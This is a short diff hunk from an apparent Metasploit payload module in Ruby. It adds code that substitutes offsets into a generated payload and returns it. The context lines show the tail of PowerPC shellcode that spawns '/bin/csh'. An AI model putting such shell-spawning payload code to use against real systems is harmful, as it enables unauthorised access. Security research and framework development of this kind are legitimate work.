@@ -112,6 +112,13 @@ module Metasploit3
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"/bin/csh"
 
+      # If the payload is generated and there are offsets to substitute,
+		# do that now.
+		if (payload and offsets)
+			substitute_vars(payload, offsets)
+		end
+
+      payload
 	end
 
 end
